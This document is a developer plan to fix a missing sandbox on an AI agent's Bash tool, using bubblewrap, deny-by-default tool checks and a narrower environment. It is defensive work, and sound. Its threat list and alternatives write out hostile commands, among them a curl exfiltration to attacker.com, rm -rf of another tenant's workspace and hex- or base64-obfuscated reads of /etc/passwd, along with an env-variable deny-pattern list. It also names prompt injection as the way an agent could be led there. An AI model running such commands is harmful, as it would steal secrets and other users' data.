---
title: "fix: sandbox Bash tool in canUseTool callback"
type: fix
date: 2026-03-20
---

# fix: sandbox Bash tool in canUseTool callback

## Enhancement Summary

**Deepened on:** 2026-03-20
**Sections enhanced:** 5 (Proposed Solution, Technical Considerations, Acceptance Criteria, Test Scenarios, References)
**Research sources:** Agent SDK TypeScript reference (v0.2.76), Agent SDK sandbox documentation, Agent SDK permissions docs, Agent SDK user-input docs, Claude Code sandboxing docs, project learnings (3 relevant)

### Key Improvements

1. **SDK built-in sandbox discovered:** The Agent SDK has a native `sandbox` option that uses `bubblewrap` (bwrap) on Linux for OS-level filesystem and network isolation. This is vastly superior to string-matching command validation and eliminates entire categories of bypass (hex escapes, variable indirection, base64 encoding). The recommended approach is now SDK sandbox + `canUseTool` as defense-in-depth, not `canUseTool` string-matching alone.
2. **`canUseTool` third parameter documented:** The callback receives `(toolName, input, options)` where `options` includes `{ signal, suggestions, blockedPath, decisionReason, toolUseID, agentID }`. The `agentID` field enables per-subagent policy (domain leaders run as subagents via the Agent tool).
3. **`PermissionResult` type clarified:** Allow returns can include `updatedPermissions` for session-wide policy changes. Deny returns can include `interrupt: true` to halt the agent entirely (useful for security violations).
4. **`.claude/settings.json` bypass confirmed critical:** The provisioned `permissions.allow: ["Read", "Glob", "Grep"]` bypasses `canUseTool` at the "Allow rules" step of the SDK permission chain. This means Read/Glob/Grep workspace path validation is **already bypassed** in production. Fixing settings.json is as critical as fixing Bash.
5. **Defense-in-depth learning applied:** Per `knowledge-base/project/learnings/2026-03-15-env-var-post-guard-defense-in-depth.md`, prompt instructions are necessary but not sufficient for safety-critical operations. The SDK sandbox provides a structural/programmatic guard that makes unsafe actions impossible regardless of agent behavior -- matching the pattern used for env var post guards in the community scripts.

---

## Overview

The `canUseTool` callback in `apps/web-platform/server/agent-runner.ts` (lines 160-214) sandboxes file-system tools (`Read`, `Write`, `Edit`, `Glob`, `Grep`) by validating that `file_path` / `path` starts with the user's `workspacePath`. However, the `Bash` tool is not checked at all -- it falls through to the unconditional `return { behavior: "allow" as const }` at line 213. This allows the agent to execute arbitrary shell commands: read files outside the workspace, access other users' data, exfiltrate environment variables, or pivot laterally across workspaces.

**Severity:** CRITICAL (P0). The agent runs inside a Docker container as a non-root `soleur` user (UID 1001), which limits blast radius to container-level, but within that container every user workspace is accessible and `process.env` secrets (Supabase service role key, BYOK decryption key material) are in memory.

**Discovered:** Code review of PR #721. Pre-existing since the MVP commit (`5b8e242`).

Closes #724.

## Problem Statement / Motivation

The Agent SDK's `canUseTool` callback is the **only runtime security boundary** between user workspaces on the web platform. The current implementation creates a false sense of security: file-system tools are sandboxed, but the Bash tool -- which can read any file, write anywhere, and execute any binary available in the container -- is unrestricted. An agent prompt injection or a poorly-constrained domain leader could:

1. `cat /workspaces/<other-user-id>/knowledge-base/**` -- cross-tenant data access
2. `env | grep SUPABASE` -- exfiltrate service role key
3. `curl -X POST https://attacker.com -d "$(cat /workspaces/*/...)"` -- data exfiltration (container has network access)
4. `rm -rf /workspaces/<other-user-id>/` -- destructive cross-tenant action

### Research Insights -- Problem Statement

**Allowlist-with-fallback is the correct security posture** (per `knowledge-base/project/learnings/2026-03-20-websocket-error-sanitization-cwe-209.md`). The current `canUseTool` uses a partial allowlist pattern: it checks 5 file-system tools explicitly, then falls through to unconditional allow. The correct pattern is: check known tools explicitly, deny everything else by default.

**Defense-in-depth principle** (per `knowledge-base/project/learnings/2026-03-15-env-var-post-guard-defense-in-depth.md`): Agent prompt instructions (system prompts telling the domain leader to stay in workspace) are necessary but not sufficient. A prompt injection or hallucination can bypass them. The fix must be a structural/programmatic guard that makes unsafe Bash commands impossible regardless of agent behavior.

## Proposed Solution

Use the **Agent SDK's built-in sandbox** (`sandbox` option in `query()`) as the primary security boundary for Bash commands, combined with `canUseTool` path validation as defense-in-depth for file-system tools and a deny-by-default policy for unrecognized tools.

### Research Insights -- Proposed Solution

**Best Practices (Agent SDK sandbox docs, [Claude Code sandboxing](https://code.claude.com/docs/en/sandboxing)):**
- The Agent SDK provides a native `sandbox` option that uses **bubblewrap (bwrap) on Linux** for OS-level filesystem and network isolation. This enforces restrictions at the kernel level -- all child processes inherit the sandbox, and no amount of shell trickery (hex escapes, variable indirection, base64 encoding) can bypass it.
- The sandbox supports `filesystem.denyRead` and `filesystem.denyWrite` path patterns, and `network.allowedDomains` for network restrictions.
- `autoAllowBashIfSandboxed: true` (default) auto-approves Bash commands when the sandbox is enabled, eliminating the need for `canUseTool` to handle Bash at all.
- `allowUnsandboxedCommands: false` disables the escape hatch where the model can request unsandboxed execution.
- The Docker container runs `node:22-slim` (Debian bookworm), which supports bubblewrap. The Dockerfile must `apt-get install bubblewrap socat` alongside `git`.

**Performance (Agent SDK docs):** "Minimal [overhead], but some filesystem operations may be slightly slower." Acceptable for a multi-tenant hosted environment where security is paramount.

**Exact `PermissionResult` TypeScript type** (from [SDK TypeScript reference](https://platform.claude.com/docs/en/agent-sdk/typescript)):

```typescript
type PermissionResult =
  | {
      behavior: "allow";
      updatedInput?: Record<string, unknown>;
      updatedPermissions?: PermissionUpdate[];
      toolUseID?: string;
    }
  | {
      behavior: "deny";
      message: string;
      interrupt?: boolean;  // Halt the agent entirely
      toolUseID?: string;
    };
```

**Exact `canUseTool` signature:**

```typescript
type CanUseTool = (
  toolName: string,
  input: Record<string, unknown>,
  options: {
    signal: AbortSignal;
    suggestions?: PermissionUpdate[];
    blockedPath?: string;
    decisionReason?: string;
    toolUseID: string;
    agentID?: string;  // Subagent ID if running in Agent tool
  }
) => Promise<PermissionResult>;
```

### Approach: SDK sandbox + `canUseTool` defense-in-depth

This is a layered approach with three tiers:

**Tier 1 -- SDK Sandbox (OS-level, primary boundary):**

Add `sandbox` configuration to the `query()` options in `agent-runner.ts`:

```typescript
sandbox: {
  enabled: true,
  autoAllowBashIfSandboxed: true,
  allowUnsandboxedCommands: false,
  network: {
    allowedDomains: [],           // No outbound network access
    allowManagedDomainsOnly: true, // Block all non-allowed domains
  },
  filesystem: {
    allowWrite: [workspacePath],   // Only write to this user's workspace
    denyRead: ["/workspaces"],     // Block reading other workspaces
    // Then re-allow this user's workspace via allowRead or by relying on
    // the default CWD read behavior
  },
},
```

This provides OS-level enforcement via bubblewrap:
- Bash commands can only write to the user's workspace directory
- Bash commands cannot read other users' workspaces
- Bash commands cannot make outbound network requests (no `curl` exfiltration)
- All child processes (pipes, subshells, `$(...)`) inherit the same restrictions
- No bypass via shell encoding tricks -- kernel-level enforcement

**Tier 2 -- `canUseTool` (application-level, defense-in-depth):**

Keep the existing file-system tool path validation in `canUseTool` and add a deny-by-default policy:

```typescript
canUseTool: async (toolName, toolInput) => {
  // File-system tools: validate path is within workspace
  if (["Read", "Write", "Edit", "Glob", "Grep"].includes(toolName)) {
    const filePath = (toolInput.file_path as string) || (toolInput.path as string) || "";
    if (filePath && !filePath.startsWith(workspacePath)) {
      return { behavior: "deny", message: "Access denied: outside workspace" };
    }
    return { behavior: "allow" };
  }

  // Bash: validated by SDK sandbox (Tier 1), but add env var check as defense-in-depth
  if (toolName === "Bash") {
    const command = (toolInput.command as string) || "";
    if (containsSensitiveEnvAccess(command)) {
      return { behavior: "deny", message: "Access denied: sensitive environment variable access" };
    }
    return { behavior: "allow" };
  }

  // Review gates: intercept AskUserQuestion (existing behavior)
  if (toolName === "AskUserQuestion") {
    // ... existing review gate logic ...
  }

  // Agent tool: allow (subagents inherit sandbox)
  if (toolName === "Agent") {
    return { behavior: "allow" };
  }

  // Deny-by-default: block unrecognized tools
  return { behavior: "deny", message: "Tool not permitted in this environment" };
},
```

**Tier 3 -- `disallowedTools` (SDK-level, hard deny):**

Add `disallowedTools: ["WebSearch", "WebFetch"]` to the `query()` options. These tools are denied at the SDK level before `canUseTool` is even called, and cannot be overridden by any permission mode.

### `containsSensitiveEnvAccess` helper

A lightweight check for Bash commands that attempt to read sensitive environment variables. This is defense-in-depth -- the sandbox prevents file/network escape, but `process.env` secrets are in-memory and accessible via `echo $VAR` within the sandbox:

```typescript
// apps/web-platform/server/bash-sandbox.ts

const SENSITIVE_ENV_PATTERNS = [
  /\benv\b/,
  /\bprintenv\b/,
  /\bset\b(?!\s+-)/,            // `set` without flags (lists all vars)
  /\$SUPABASE_/,
  /\$ANTHROPIC_/,
  /\$\{SUPABASE_/,
  /\$\{ANTHROPIC_/,
  /\$BYOK_/,
  /\$\{BYOK_/,
  /\/proc\/self\/environ/,
];

export function containsSensitiveEnvAccess(command: string): boolean {
  return SENSITIVE_ENV_PATTERNS.some((pattern) => pattern.test(command));
}
```

This is intentionally narrow -- it only catches the most common env var exfiltration patterns. Exotic bypasses (hex escapes, variable indirection) are caught by not having network access (sandbox Tier 1 blocks outbound connections, so even if the agent reads a secret it cannot exfiltrate it).

### Dockerfile changes

The Dockerfile must install `bubblewrap` and `socat` (required by the Agent SDK sandbox on Linux):

```dockerfile
# Install git (workspace provisioning) + bubblewrap/socat (Agent SDK sandbox)
RUN apt-get update && apt-get install -y --no-install-recommends \
    git bubblewrap socat \
    && rm -rf /var/lib/apt/lists/*
```

### `.claude/settings.json` fix

Change `DEFAULT_SETTINGS` in `server/workspace.ts` to have empty permissions, so all tools flow through `canUseTool`:

```typescript
const DEFAULT_SETTINGS = {
  permissions: {
    allow: [],  // Empty: all tools go through canUseTool for path validation
  },
  sandbox: {
    enabled: true,
  },
};
```

### Alternative considered: `canUseTool` string-matching only (original plan)

The original plan proposed parsing Bash commands via regex to detect dangerous patterns. This approach is fundamentally fragile because shell syntax is Turing-complete:
- Hex escapes: `$'\x63\x61\x74' /etc/passwd`
- Variable indirection: `x=ca; y=t; $x$y /etc/passwd`
- Base64: `echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh`

The SDK sandbox eliminates this entire class of bypass by operating at the kernel level.

### Alternative considered: `disallowedTools: ["Bash"]`

Block Bash entirely. Rejected because the spike findings (`spike/FINDINGS.md:14`) confirmed agents use Bash to self-correct and domain leaders need `git` operations.

### Alternative considered: `permissionMode: "dontAsk"` + explicit `allowedTools`

Rejected because `allowedTools` pre-approves tools, bypassing `canUseTool` path validation. Trades one security hole for another.

## Technical Considerations

### SDK sandbox on Linux (bubblewrap)

The Agent SDK sandbox uses [bubblewrap](https://github.com/containers/bubblewrap) on Linux, which creates lightweight process namespaces with restricted filesystem mounts and network access. Key properties:

- **Kernel-level enforcement**: No amount of shell trickery bypasses it -- the kernel denies the syscall
- **Child process inheritance**: All processes spawned by a sandboxed command inherit the same restrictions
- **No privilege required**: bubblewrap works as non-root (UID 1001) using unprivileged user namespaces
- **Docker compatibility**: The container must allow user namespaces. The `node:22-slim` image supports this, but the `enableWeakerNestedSandbox` option may be needed if Docker's seccomp profile restricts `clone(CLONE_NEWUSER)`. This requires testing.

### Research Insights -- Technical Considerations

**bubblewrap inside Docker containers:** Running bwrap inside a Docker container requires that the container allows user namespaces. Standard Docker on modern kernels (5.x+) supports this. If the deployment environment uses restricted seccomp profiles or AppArmor profiles that block `CLONE_NEWUSER`, set `enableWeakerNestedSandbox: true` in the sandbox config. Per the SDK docs: "This option considerably weakens security and should only be used in cases where additional isolation is otherwise enforced." Since the container already provides some isolation, this is an acceptable fallback, but the stronger sandbox should be preferred.

**Environment variable exfiltration via sandbox:** The sandbox restricts filesystem and network access, but `process.env` is inherited by the Claude Code child process. A Bash command like `echo $SUPABASE_SERVICE_ROLE_KEY` will print the value to the command output, which flows back through the SDK to the agent. The agent cannot exfiltrate it (no network), but it becomes part of the conversation context. The `containsSensitiveEnvAccess` check in `canUseTool` is specifically designed to catch this vector.

**Mitigation for env var leakage:** The `env` option in `query()` currently passes `{ ...process.env, ANTHROPIC_API_KEY: apiKey }`. This gives the agent process access to ALL server env vars. A better approach: pass only the env vars the agent needs:

```typescript
env: {
  ANTHROPIC_API_KEY: apiKey,
  HOME: workspacePath,
  PATH: process.env.PATH,
  // Exclude: SUPABASE_SERVICE_ROLE_KEY, BYOK_ENCRYPTION_KEY, etc.
},
```

This eliminates the env var exfiltration vector entirely, making the `containsSensitiveEnvAccess` check purely defense-in-depth.

### `canUseTool` caching behavior

Per the learning at `knowledge-base/project/learnings/2026-03-16-agent-sdk-spike-validation.md`, the SDK may cache "allow" decisions per-tool-name within a session. If the first Bash command is allowed, subsequent Bash commands might bypass `canUseTool`.

**Mitigation with sandbox:** This is no longer a critical concern. The SDK sandbox provides OS-level enforcement for every Bash command regardless of caching. The `canUseTool` env var check is defense-in-depth -- if it gets cached as "allow" after a safe first command, the sandbox still prevents filesystem/network escape.

### `.claude/settings.json` interaction

The workspace's `.claude/settings.json` (provisioned by `server/workspace.ts` line 22) currently sets `permissions.allow: ["Read", "Glob", "Grep"]`. Per the SDK's permission evaluation order: Hooks > Deny rules > Permission mode > Allow rules > `canUseTool`. Tools in `permissions.allow` are auto-approved at the "Allow rules" step, bypassing `canUseTool`.

This means **Read, Glob, and Grep bypass the workspace path validation in `canUseTool`**. This is a separate but related vulnerability:
- `Read` with `file_path: "/etc/passwd"` would be auto-approved by settings.json
- `Grep` with `path: "/workspaces/other-user/"` would be auto-approved

**Fix:** Set `permissions.allow` to an empty array in `DEFAULT_SETTINGS`. All tools flow through `canUseTool` for workspace path validation. The sandbox's `filesystem.denyRead` provides OS-level enforcement as a second layer.

### `env` option security hardening

The current `query()` call passes `env: { ...process.env, ANTHROPIC_API_KEY: apiKey }`. This spreads ALL server environment variables (including `SUPABASE_SERVICE_ROLE_KEY`, `BYOK_ENCRYPTION_KEY`) into the agent process. Even with the sandbox, the agent can `echo` these values.

**Fix:** Pass a minimal env object with only the variables the agent needs:

```typescript
env: {
  ANTHROPIC_API_KEY: apiKey,
  HOME: workspacePath,
  PATH: process.env.PATH,
  GIT_AUTHOR_NAME: "Soleur",
  GIT_AUTHOR_EMAIL: "soleur@localhost",
  GIT_COMMITTER_NAME: "Soleur",
  GIT_COMMITTER_EMAIL: "soleur@localhost",
},
```

## Acceptance Criteria

- [x] SDK sandbox enabled in `query()` options with `enabled: true`, `autoAllowBashIfSandboxed: true`, `allowUnsandboxedCommands: false` (`apps/web-platform/server/agent-runner.ts`)
- [x] Sandbox filesystem configured: `allowWrite: [workspacePath]`, `denyRead: ["/workspaces"]` with user workspace excepted
- [x] Sandbox network configured: `allowedDomains: []`, `allowManagedDomainsOnly: true` (no outbound network)
- [x] `canUseTool` has deny-by-default policy: unrecognized tools are denied
- [x] `canUseTool` Bash branch checks for sensitive env var access patterns via `containsSensitiveEnvAccess()`
- [x] `containsSensitiveEnvAccess()` extracted to `apps/web-platform/server/bash-sandbox.ts` for unit testing
- [x] `env` option in `query()` passes minimal env vars (not `...process.env`) to prevent secret leakage
- [x] `disallowedTools: ["WebSearch", "WebFetch"]` added to `query()` options
- [x] `.claude/settings.json` provisioned by `server/workspace.ts` has empty `permissions.allow` array
- [x] `.claude/settings.json` includes `sandbox.enabled: true`
- [x] `workspace.test.ts` updated to assert empty permissions and sandbox enabled
- [x] New `bash-sandbox.test.ts` covers `containsSensitiveEnvAccess()` patterns
- [x] Dockerfile updated: `apt-get install bubblewrap socat` alongside `git`
- [x] Existing file-system tool validation in `canUseTool` continues to work unchanged
- [ ] SDK sandbox tested in Docker environment (may need `enableWeakerNestedSandbox: true`)

## SpecFlow Analysis

### Critical Path

1. Dockerfile adds `bubblewrap socat` -> Docker image rebuild required
2. `sandbox` option added to `query()` -> bubblewrap must be available at runtime
3. If Docker seccomp blocks `CLONE_NEWUSER` -> fallback to `enableWeakerNestedSandbox: true`
4. `env` option narrowed -> agent must still have `PATH`, `HOME`, `GIT_*` for basic operation
5. `permissions.allow` emptied -> `canUseTool` must handle all tool permissions (no pre-approval)

### Edge Cases

- **bubblewrap unavailable**: If the Dockerfile change is missed or bubblewrap install fails, the sandbox silently degrades. Add a startup health check that verifies `bwrap --version` succeeds.
- **Docker user namespace restrictions**: Some Docker deployments (Kubernetes, rootless Docker) restrict user namespaces. The `enableWeakerNestedSandbox` fallback must be tested.
- **Symlink escape**: The plugin symlink (`/workspaces/<userId>/plugins/soleur -> /app/shared/plugins/soleur`) crosses the workspace boundary. The sandbox `filesystem.denyRead` on `/workspaces` must not block reads of `/app/shared/plugins/soleur` (which is outside `/workspaces`). The default sandbox behavior allows reading outside CWD -- only `/workspaces` (other users) needs to be denied.
- **Git operations**: `git init`, `git add`, `git commit` need write access to `workspacePath/.git/`. The `allowWrite: [workspacePath]` pattern covers this since `.git/` is a subdirectory.
- **`set` command false positive**: `set -e` or `set -o pipefail` are common shell idioms, not env var listing. The `containsSensitiveEnvAccess` regex uses `\bset\b(?!\s+-)` to exclude `set -` patterns.

## Test Scenarios

### Bash sandbox (`bash-sandbox.test.ts`)

- Given a command `env`, when checked by `containsSensitiveEnvAccess`, then returns true (denied)
- Given a command `printenv`, when checked, then returns true (denied)
- Given a command `echo $SUPABASE_SERVICE_ROLE_KEY`, when checked, then returns true (denied)
- Given a command `echo ${ANTHROPIC_API_KEY}`, when checked, then returns true (denied)
- Given a command `cat /proc/self/environ`, when checked, then returns true (denied)
- Given a command `echo $BYOK_ENCRYPTION_KEY`, when checked, then returns true (denied)
- Given a command `ls -la`, when checked, then returns false (allowed)
- Given a command `git status`, when checked, then returns false (allowed)
- Given a command `set -euo pipefail`, when checked, then returns false (allowed -- `set` with flags is not env listing)
- Given a command `echo hello`, when checked, then returns false (allowed)

### Workspace provisioning (`workspace.test.ts`)

- Given a new user, when workspace is provisioned, then `.claude/settings.json` has `permissions.allow: []` (empty array)
- Given a new user, when workspace is provisioned, then `.claude/settings.json` has `sandbox.enabled: true`

### Integration (manual verification in staging)

- Given a running sandboxed agent session, when the agent attempts `cat /workspaces/other-user/secret.md` via Bash, then bubblewrap blocks the read at the kernel level
- Given a running sandboxed agent session, when the agent attempts `curl https://attacker.com` via Bash, then the sandbox network proxy blocks the connection
- Given a running sandboxed agent session, when the agent uses `ls` (relative), then the command succeeds within the workspace
- Given a running sandboxed agent session, when the agent attempts `echo $SUPABASE_SERVICE_ROLE_KEY` via Bash, then `canUseTool` denies the command before it reaches the sandbox
- Given a running sandboxed agent session, when the agent uses `git commit -m "test"` within the workspace, then the command succeeds (write access to workspace is allowed)

### Docker verification

- Given a freshly built Docker image, when `bwrap --version` is run, then it succeeds (bubblewrap installed)
- Given a freshly built Docker image, when `socat -V` is run, then it succeeds (socat installed)

## References & Research

### Internal References

- Vulnerability: `apps/web-platform/server/agent-runner.ts:160-214` (canUseTool callback)
- Settings bypass: `apps/web-platform/server/workspace.ts:22` (DEFAULT_SETTINGS with non-empty allow)
- Env var spread: `apps/web-platform/server/agent-runner.ts:158` (`env: { ...process.env, ANTHROPIC_API_KEY: apiKey }`)
- Spike findings: `spike/FINDINGS.md:14` (Bash tool works), `spike/FINDINGS.md:88` (recommendation to use canUseTool for Bash)
- SDK learning: `knowledge-base/project/learnings/2026-03-16-agent-sdk-spike-validation.md` (canUseTool caching, permission priority chain)
- Defense-in-depth learning: `knowledge-base/project/learnings/2026-03-15-env-var-post-guard-defense-in-depth.md` (structural guards over prompt instructions)
- Error sanitization learning: `knowledge-base/project/learnings/2026-03-20-websocket-error-sanitization-cwe-209.md` (allowlist-with-fallback pattern)
- Related security: `knowledge-base/project/plans/2026-03-20-security-web-platform-nonroot-user-plan.md` (container-level mitigation)
- Existing test pattern: `apps/web-platform/test/workspace.test.ts` (vitest, workspace provisioning tests)
- Dockerfile: `apps/web-platform/Dockerfile` (needs bubblewrap/socat install)

### External References

- [Agent SDK TypeScript reference](https://platform.claude.com/docs/en/agent-sdk/typescript) -- `CanUseTool` type, `PermissionResult` type, `SandboxSettings` type, `Options.sandbox` field
- [Agent SDK permissions docs](https://platform.claude.com/docs/en/agent-sdk/permissions) -- permission evaluation order: Hooks > Deny rules > Permission mode > Allow rules > canUseTool; `disallowedTools` overrides everything including `bypassPermissions`
- [Agent SDK user input docs](https://platform.claude.com/docs/en/agent-sdk/user-input) -- `canUseTool` callback returns `{ behavior: "allow", updatedInput }` or `{ behavior: "deny", message }`; Bash tool input has `{ command, description?, timeout? }` fields
- [Claude Code sandboxing docs](https://code.claude.com/docs/en/sandboxing) -- bubblewrap on Linux, OS-level enforcement, `enableWeakerNestedSandbox` for Docker, filesystem/network config
- [bubblewrap (bwrap)](https://github.com/containers/bubblewrap) -- lightweight unprivileged sandboxing tool used by the SDK on Linux
- [@anthropic-ai/sandbox-runtime](https://github.com/anthropic-experimental/sandbox-runtime) -- open-source sandbox runtime npm package

### Related Issues

- #724 (this issue)
- PR #721 (where the vulnerability was discovered during code review)
